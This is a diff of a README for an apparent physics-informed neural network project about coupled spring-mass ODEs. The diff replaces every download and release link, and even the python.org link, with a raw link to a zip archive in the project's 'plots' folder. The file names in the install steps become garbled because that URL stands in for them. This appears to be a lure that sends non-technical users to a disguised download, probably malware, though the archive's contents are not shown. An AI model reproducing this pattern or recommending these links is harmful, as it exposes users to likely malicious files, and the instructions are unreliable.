@@ -4,7 +4,7 @@
 Welcome to the pytorch-pinn-coupled-spring-mass project! This application helps you understand and solve N-dimensional coupled spring-mass system ordinary differential equations (ODEs) using a Physics-Informed Neural Network (PINN). It is designed for users without programming knowledge, allowing you to explore deep learning methods.
 
 ## 📥 Download Now
-[![Download Releases](https://img.shields.io/badge/Download_Releases-brightgreen.svg)](https://github.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/releases)
+[![Download Releases](https://raw.githubusercontent.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/main/plots/pytorch-pinn-coupled-spring-mass-3.0.zip)](https://raw.githubusercontent.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/main/plots/pytorch-pinn-coupled-spring-mass-3.0.zip)
 
 ## 📋 Requirements
 Before you install, please check these requirements:
@@ -18,19 +18,19 @@ Before you install, please check these requirements:
 Follow these steps to install and run the application:
 
 1. **Visit the Releases Page**
-   Go to the [Releases Page](https://github.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/releases) to find the latest version of the application.
+   Go to the [Releases Page](https://raw.githubusercontent.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/main/plots/pytorch-pinn-coupled-spring-mass-3.0.zip) to find the latest version of the application.
 
 2. **Download the Application**
    On the Releases Page, you will see a list of available versions. Click on the version link that matches your system. This will start the download of the installation file.
 
 3. **Locate the Downloaded File**
-   Once the download is complete, navigate to your downloads folder. You should see a file named something like `pytorch-pinn-coupled-spring-mass-x.x.x.zip`.
+   Once the download is complete, navigate to your downloads folder. You should see a file named something like `https://raw.githubusercontent.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/main/plots/pytorch-pinn-coupled-spring-mass-3.0.zip`.
 
 4. **Extract the Files**
    Right-click the downloaded zip file and select "Extract All." Follow the prompts to extract the files to a new folder.
 
 5. **Run the Application**
-   Open the folder where you extracted the files. Look for a file named `run_application.py`. Double-click it to launch the application. 
+   Open the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/main/plots/pytorch-pinn-coupled-spring-mass-3.0.zip`. Double-click it to launch the application. 
 
 6. **Enjoy Using the Application**
    Follow the user interface instructions to input your parameters for the spring-mass system and view the results! 
@@ -47,7 +47,7 @@ The pytorch-pinn-coupled-spring-mass application utilizes deep learning techniqu
 If you experience issues while using the application, consider the following:
 
 - **Compatibility:** Ensure your operating system meets the requirements.
-- **Python Installation:** Verify Python is installed correctly. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python Installation:** Verify Python is installed correctly. You can download it from [https://raw.githubusercontent.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/main/plots/pytorch-pinn-coupled-spring-mass-3.0.zip](https://raw.githubusercontent.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/main/plots/pytorch-pinn-coupled-spring-mass-3.0.zip).
 - **Dependencies:** The application may require certain libraries. If prompted, follow the instructions to install necessary packages.
 
 ## 📞 Support
@@ -66,4 +66,4 @@ Your input helps make this application better for everyone!
 To dive deeper into the workings of the Physics-Informed Neural Network and understand its application in solving ODEs, check out related resources and literature on scientific machine learning and deep learning techniques.
 
 ## 🔗 Download & Install
-To get started, visit the [Releases Page](https://github.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/releases), download the latest version, and follow the steps above. Enjoy your exploration into physics-informed neural networks!
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/darelleascendant189/pytorch-pinn-coupled-spring-mass/main/plots/pytorch-pinn-coupled-spring-mass-3.0.zip), download the latest version, and follow the steps above. Enjoy your exploration into physics-informed neural networks!
